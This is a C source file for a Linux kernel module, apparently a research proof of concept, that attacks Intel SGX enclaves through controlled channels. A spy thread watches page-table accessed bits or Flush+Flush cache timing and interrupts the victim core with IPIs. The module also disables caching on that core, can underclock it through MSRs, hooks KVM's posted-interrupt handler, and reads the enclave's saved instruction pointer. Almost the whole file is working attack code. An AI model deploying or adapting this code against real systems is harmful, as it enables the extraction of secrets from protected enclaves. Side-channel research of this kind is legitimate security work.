#include "gsgx_attacker.h"
#include "gsgx_attacker_internal.h"
#include "gsgx_attacker_config.h"
#include "gsgx_attacker_pte_set.h"

#include <linux/mm.h>
#include <asm/uaccess.h>
#include <asm/irq.h>
#include <asm/apic.h>
#include <asm/apicdef.h>

#if CONFIG_UNDERCLOCK_VICTIM
    #include <asm/msr.h>
    #include <asm/msr-index.h>
#endif

/* Control variables accessed from spy/victim thread */
volatile int spy_stop = 0, spy_ready = 0;
volatile int victim_ready = 0, nb_ipi = 0;

struct victim_ipi_init_info ipi_init_info = {
    .victim_cpu = 0,
    .cur_tcs = 0x0,
    .erip_base = 0x0,
    .aep = 0x0
};

/* ============ IOCTL INTERFACE ============= */

long gsgx_ioctl_spy_init(struct file *filep, unsigned int cmd,
                    unsigned long arg)
{
    spy_stop = 0;
    spy_ready = 0;
    victim_ready = 0;
    nb_ipi = 0;

    return 0;
}

long gsgx_ioctl_spy_stop(struct file *filep, unsigned int cmd,
                    unsigned long arg)
{
    spy_stop = 1;

    return 0;
}

long gsgx_ioctl_spy_wait(struct file *filep, unsigned int cmd,
                    unsigned long arg)
{
    while(!spy_ready);

    return 0;
}

long gsgx_ioctl_spy_start(struct file *filep, unsigned int cmd,
                    unsigned long arg)
{
    struct gsgx_spy_info *spy_info = (struct gsgx_spy_info *) arg;

    ipi_init_info.victim_cpu = spy_info->ipi_cpu_nb;
    ipi_init_info.cur_tcs = spy_info->cur_tcs;
    ipi_init_info.aep = spy_info->aep;

    smp_call_function_single(spy_info->ipi_cpu_nb, &victim_ipi_init,
                NULL, /*wait=*/ 1);

    gsgx_spy_thread(spy_info);

    smp_call_function_single(spy_info->ipi_cpu_nb, &victim_ipi_final,
                NULL, /*wait=*/ 1);
    return 0;
}

/* ============ SPY KERNEL THREAD ============= */

void gsgx_spy_thread(struct gsgx_spy_info *spy_info)
{
    spy_pte_set_t *spy_pte_set = build_pte_set();
    uint64_t *monitor_pte_pt = spy_pte_set->monitor_pte_pt;
    size_t delta = 0;
    uint64_t ipis = 0;

    #if CONFIG_USE_KVM_IPI_HOOK
        unsigned int apic_cfg = APIC_DEST_ALLBUT | apic->dest_logical |
            APIC_DM_FIXED | POSTED_INTR_WAKEUP_VECTOR;
        volatile uint64_t *apic_icr_addr = (uint64_t*) (APIC_BASE + APIC_ICR);

        pr_info("gsgx-spy: hooking into local APIC KVM IPI addr/cfg %p/%x\n",
            apic_icr_addr, apic_cfg);
    #endif

    ipi_init_info.erip_base = spy_pte_set->erip_base;
    clear_pte_set(spy_pte_set);
    gsgx_flush(monitor_pte_pt);
    spy_stop = 0; spy_ready = 1;

    while (1)
    {
        #if CONFIG_FLUSH_FLUSH
            while(!spy_stop)
            // && (delta < CONFIG_CLFLUSH_THRESHOLD)) //TODO seems to hang?
            {
                asm("mfence\n\t"
                    "rdtsc\n\t"
                    "mov %%rax, %%rbx\n\t"
                    "mfence\n\t"
                    "clflush (%1)\n\t"
                    "mfence\n\t"
                    "rdtsc\n\t"
                    "sub %%rbx, %%rax\n\t"
                    "mfence\n\t"
                    "mov %%rax, %0\n\t"
                    :"=r"(delta)
                    :"r"(monitor_pte_pt)
                    :"rax", "rbx", "rcx", "rdx");
                if (delta > CONFIG_CLFLUSH_THRESHOLD && delta < CONFIG_CLFLUSH_MAX) break;
            }
        #else
            while(!spy_stop && !ACCESSED(monitor_pte_pt)) ;
        #endif
#if 0
        int cntr = 0;
        while(!ACCESSED(monitor_pte_pt)) cntr++;
#endif

        if (spy_stop) break;
        
        /*
         * XXX Interrupt enclave victim thread so as to flush TLB.
         */
        spy_ready = 0;
        #if CONFIG_USE_KVM_IPI_HOOK
            asm volatile ("mov %1, %0\n\t"
                :"=m"(*apic_icr_addr):"r"(apic_cfg):);
        #else
            smp_call_function_single(spy_info->ipi_cpu_nb,
                &victim_ipi_handler, NULL, /*wait=*/0);
        #endif
	ipis++;
        while(!victim_ready);

        // Stop spy thread if more than 500000 ipis have been done, prevents chrashing the TUB machine.
        if (ipis >= 500000)
        {
            spy_ready = 1;
            break;
        }

        //printk("A/D counter is %d\n", cntr);

        trace_printk("IPI %d with PTE set %#llx\n",
            nb_ipi, test_pte_set(spy_pte_set));
        #if CONFIG_FLUSH_FLUSH
            trace_printk("monitor_pte_pt A bit is %d CLFLUSH delta=%lu\n",
                ACCESSED(monitor_pte_pt), delta);
        #endif

        clear_pte_set(spy_pte_set);
        gsgx_flush(monitor_pte_pt);
        spy_ready = 1;
    }

    free_pte_set(spy_pte_set);
}

/* ============ VICTIM IPI HANDLER FUNCTIONS ============= */

void victim_ipi_init(void *info)
{
    pr_info("gsgx-victim: ipi_init on CPU %d\n", smp_processor_id());

    CR0_DISABLE_CACHE
}

void victim_ipi_final(void *info)
{
    CR0_ENABLE_CACHE

    pr_info("gsgx-victim: ipi_final on CPU %d (handled %d IPIs)\n",
        smp_processor_id(), nb_ipi);
}

void victim_ipi_handler(void *info)
{
    #if CONFIG_EDBGRD_RIP
        unsigned long erip, tcs;
        int offset;
        struct pt_regs *regs = task_pt_regs(current);
        WARN_ON(!regs);
        if (regs && (regs->ip == ipi_init_info.aep))
        {
            // HACK: rbx should contain TCS adrs, but somehow zero sometimes 
            tcs = regs->bx ? regs->bx : (unsigned long) ipi_init_info.cur_tcs;
            erip = edbgrd_ssa(tcs, SGX_GPRSGX_RIP_OFFSET);
            offset = erip - ipi_init_info.erip_base;
            trace_printk("IPI %d rip=0x%lx (offset=0x%x)\n", 
                nb_ipi+1, erip, offset);
        }
        else if (regs)
        {
            pr_warn("gsgx-spy: interrupted non-enclave code at %#lx\n",
                regs->ip);
            trace_printk("IPI %d non-enclave rip=%#lx (aep=%#lx)\n",
                nb_ipi+1, regs->ip, (unsigned long) ipi_init_info.aep);
        }
    #endif

    nb_ipi++;

    /*
     * Ensure TLB entry is flushed.
     * NOTE: this is only needed when testing in dummy mode. Enclave TLB
     * entries are automatically flushed on EENTER.
     */
    //native_write_cr3(native_read_cr3());

    /*
     * Wait for spy thread before resuming enclave.
     */
    victim_ready = 1;
    while (!spy_ready);
    victim_ready = 0;
}

void ipi_handler(void)
{
    int me = smp_processor_id();
    //pr_info("gsgx-victim: IPI %d on CPU %d\n", nb_ipi, smp_processor_id());

    //XXX ignore IPI on non-enclave CPUs
    if (ipi_init_info.victim_cpu != me)
    {
        pr_warn("gsgx-victim: ignoring IPI on non-enclave CPU %d...\n", me);
        return;
    }

    victim_ipi_handler(NULL);
}

/* ============ HELPER FUNCTIONS ============= */

/*
 * Walk 4-level page table: Page Global Directory - Page Upper Directory -
 * Page Middle Directory - Page Table Entry.
 */
pte_t *get_pte_adrs(uint64_t adrs)
{
    unsigned long val; int rv;
    pgd_t * pgd = pgd_offset(current->mm, adrs);
    pud_t * pud = pud_offset(pgd, adrs);
    pmd_t * pmd = pmd_offset(pud, adrs);
    pte_t * pte = pte_offset_map(pmd, adrs);

    // XXX Dummy access to ensure page is mapped in (abort page semantics)
    rv = get_user(val, (unsigned long*) adrs);
    pr_info("gsgx-spy: accessing vadrs %p: %#lx (rv=%d)\n",
        (void*) adrs, val, rv);
    pr_info("gsgx-spy: monitoring PTE for vadrs %p at %p with value %p\n",
        (void*) adrs, (void*) pte, (void*) pte_val(*pte));

    return pte;
}

#if CONFIG_EDBGRD_RIP
uint64_t edbgrd_ssa(unsigned long tcs_address, int ssa_field_offset)
{
    uint64_t ossa, err, rv;
    unsigned long ebase, ssaframesize, ssa_field_address;
    struct vm_area_struct *vma = NULL;

    vma = find_vma(current->mm, tcs_address);
    RET_WARN_ON(!vma, 0);

    ebase = isgx_get_enclave_base(vma);
    ssaframesize = isgx_get_enclave_ssaframesize(vma) * PAGE_SIZE;
    err = isgx_vma_access(vma, tcs_address + SGX_TCS_OSSA_OFFSET, &ossa, 8, 0);
    RET_WARN_ON(err <= 0, err);

    ssa_field_address = ebase + ossa + ssaframesize - SGX_GPRSGX_SIZE +
                                                    ssa_field_offset;
    err = isgx_vma_access(vma, ssa_field_address, &rv, 8, 0);
    RET_WARN_ON(err <= 0, err);

    return rv;
}
#endif

/* 
 * Code adapted from: Yarom, Yuval, and Katrina Falkner. "Flush+ reload: a high
 * resolution, low noise, L3 cache side-channel attack." 23rd USENIX Security
 * Symposium (USENIX Security 14). 2014.
 */
unsigned long gsgx_reload(void* p)
{
    volatile unsigned long time;
    
    asm volatile (
        "mfence\n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        "lfence\n\t"
        "movl %%eax, %%esi\n\t"
        "movl (%1), %%eax\n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        "subl %%esi, %%eax \n\t"
        : "=a" (time)
        : "c" (p)
        : "%rsi", "%rdx");
    
    return time;
}

void gsgx_flush(void* p) {
    asm volatile ("clflush (%0)\n\t"
        :
        : "c" (p)
        : "%rax");
}

/*
 * Directly program the per-cpu Hardware-Controlled Performance State (HWP)
 * MSRs as explained in Intel SDM section 14.4.4.
 *
 * NOTE: This does not seem to work on client Skylake machine with a single
 * clock domain. The hardware applies the Pstate of the core requesting the
 * highest Pstate to all cores. This means we cannot underclock the victim
 * thread without also slowing down the spy equally...
 */
#if CONFIG_UNDERCLOCK_VICTIM
void set_cpu_freq(int cpu, int val)
{
    uint64_t request = 0x0;;
    rdmsrl_on_cpu(cpu, MSR_HWP_REQUEST, &request);

    request &= ~HWP_MIN_PERF(~0L);
    request |= HWP_MIN_PERF( val );
    request &= ~HWP_MAX_PERF(~0L);
    request |= HWP_MAX_PERF( val );
    request &= ~HWP_DESIRED_PERF(~0L);
    request |= HWP_DESIRED_PERF( val );

    wrmsrl_on_cpu(cpu, MSR_HWP_REQUEST, request);    
}
#endif

void gsgx_attacker_setup(void)
{
#if CONFIG_UNDERCLOCK_VICTIM
    uint64_t capabilities = 0x0;
    rdmsrl_on_cpu(1, MSR_HWP_CAPABILITIES, &capabilities);
    set_cpu_freq(1, HWP_HIGHEST_PERF(capabilities));

    rdmsrl_on_cpu(0, MSR_HWP_CAPABILITIES, &capabilities);
    set_cpu_freq(0, HWP_LOWEST_PERF(capabilities));
#endif

#if CONFIG_USE_KVM_IPI_HOOK
    kvm_set_posted_intr_wakeup_handler(ipi_handler);
#endif
}

void gsgx_attacker_teardown(void)
{
#if CONFIG_USE_KVM_IPI_HOOK
    kvm_set_posted_intr_wakeup_handler(NULL);
#endif
    CR0_ENABLE_CACHE
}
